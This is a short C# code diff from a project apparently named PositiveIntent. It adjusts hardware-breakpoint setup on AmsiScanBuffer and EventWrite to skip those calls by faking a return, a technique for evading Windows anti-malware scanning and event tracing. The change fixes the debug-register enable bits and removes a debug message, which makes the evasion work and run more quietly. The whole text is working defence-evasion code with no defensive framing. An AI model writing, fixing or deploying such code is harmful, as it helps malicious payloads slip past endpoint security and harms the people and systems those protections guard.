@@ -91,8 +91,9 @@ namespace PositiveIntent
                     context.Dr2 = (ulong)amsiScanBuffer;
                 }
 
-                // Configure Dr7: Enable Dr0, Dr1, Dr2 debug registers
-                context.Dr7 = 0x3 | (0x3 << 4) | (0x3 << 8);
+                // Configure Dr7
+                // Set bits 0 (L0), 2 (L1), and 4 (L2) to 1 to enable enable Dr0, Dr1, Dr2 debug registers
+                context.Dr7 = 0x1 | 0x4 | 0x10;
 
                 // Mark that we want debug registers updated
                 context.ContextFlags |= CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL | CONTEXT_INTEGER;
@@ -134,7 +135,6 @@ namespace PositiveIntent
 
                 if ((context.Dr6 & 0x2) != 0)
                 {
-                    Console.WriteLine("EventWrite breakpoint hit");
                     // Simulate a 'ret' instruction
                     ulong returnAddress = (ulong)Marshal.ReadInt64(new IntPtr((long)context.Rsp));
                     context.Rip = returnAddress;
